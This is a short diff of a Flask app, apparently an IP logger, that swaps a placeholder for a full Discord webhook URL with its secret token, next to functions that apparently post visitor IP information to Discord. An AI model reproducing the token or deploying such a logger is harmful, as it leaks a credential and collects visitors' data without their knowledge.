@@ -4,7 +4,7 @@ import json
 
 app = Flask(__name__)
 
-DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'
+DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1334821132876120099/Cih_JEF2oZ-SAqEv-WhGrgHH1CwLxNuEvEYU8GzNzkjPmRYga39V-ranJY9Rti1neiRs'
 
 def send_to_discord(info):
     data = {
@@ -53,3 +53,4 @@ def log_ip_info():
 
 if __name__ == '__main__':
     app.run(debug=True)
+
